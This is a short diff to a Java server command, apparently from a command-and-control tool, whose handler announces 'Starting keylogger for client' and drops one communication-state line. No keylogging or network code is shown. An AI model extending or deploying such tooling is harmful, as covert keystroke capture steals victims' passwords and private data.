@@ -10,9 +10,7 @@ public class KStartCmd extends ServerCommand{
 	}
 	
 	@Override
-	public String exec(ParsedCommand pCmd) {
-		c2.setCommunicating(true);
-		
+	public String exec(ParsedCommand pCmd) {		
 		System.out.println("Starting keylogger for client " + pCmd.args[0]);
 		
 		if (c2.getCurrentClient() >= 0)
